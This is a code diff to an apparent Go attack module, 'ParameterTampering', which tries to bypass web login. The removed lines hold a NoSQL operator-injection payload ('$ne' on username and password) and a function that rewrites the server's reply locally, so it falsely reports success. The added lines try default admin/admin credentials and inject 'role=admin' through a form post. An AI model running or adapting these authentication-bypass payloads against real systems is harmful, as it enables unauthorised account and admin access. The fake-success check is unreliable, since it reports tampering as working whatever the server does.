@@ -20,22 +20,7 @@ Client: &http.Client{},
 }
 }
 
-func (p *ParameterTampering) TamperUsername() (bool, error) {
-payload := map[string]interface{}{
-"username": map[string]string{"$ne": ""},
-"password": map[string]string{"$ne": ""},
-}
-body, _ := json.Marshal(payload)
-resp, err := http.Post(p.URL, "application/json", bytes.NewBuffer(body))
-if err != nil {
-return false, err
-}
-defer resp.Body.Close()
-data, _ := io.ReadAll(resp.Body)
-return strings.Contains(string(data), "Welcome") || strings.Contains(string(data), "Dashboard"), nil
-}
-
-func (p *ParameterTampering) TamperRole() (bool, error) {
+func (p *ParameterTampering) BypassWithJSON() (bool, error) {
 payload := map[string]interface{}{
 "username": "admin",
 "password": "admin",
@@ -51,24 +36,20 @@ data, _ := io.ReadAll(resp.Body)
 return strings.Contains(string(data), "Welcome") || strings.Contains(string(data), "Dashboard"), nil
 }
 
-func (p *ParameterTampering) TamperResponse() (bool, error) {
-resp, err := http.Get(p.URL)
+func (p *ParameterTampering) BypassWithForm() (bool, error) {
+payload := strings.NewReader("username=admin&password=admin&role=admin")
+resp, err := http.Post(p.URL, "application/x-www-form-urlencoded", payload)
 if err != nil {
 return false, err
 }
 defer resp.Body.Close()
 data, _ := io.ReadAll(resp.Body)
-content := strings.ReplaceAll(string(data), "\"success\":false", "\"success\":true")
-content = strings.ReplaceAll(content, "\"role\":\"user\"", "\"role\":\"admin\"")
-return strings.Contains(content, "success"), nil
+return strings.Contains(string(data), "Welcome") || strings.Contains(string(data), "Dashboard"), nil
 }
 
 func (p *ParameterTampering) DumpAll() (bool, error) {
-if ok, _ := p.TamperUsername(); ok {
+if ok, _ := p.BypassWithJSON(); ok {
 return true, nil
 }
-if ok, _ := p.TamperRole(); ok {
-return true, nil
-}
-return p.TamperResponse()
+return p.BypassWithForm()
 }
